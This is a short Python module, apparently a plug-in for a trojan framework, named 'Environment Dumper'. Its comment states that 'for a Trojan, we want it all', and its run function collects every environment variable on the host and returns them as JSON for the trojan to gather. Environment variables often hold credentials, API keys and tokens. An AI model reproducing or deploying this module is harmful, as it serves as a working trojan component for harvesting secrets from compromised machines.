import os
import json

def run(**args):
    print("[*] In Environment Dumper module.")
    # Filter out common but not sensitive-looking variables if needed, 
    # but for a Trojan, we want it all.
    env_vars = dict(os.environ)
    return json.dumps(env_vars)
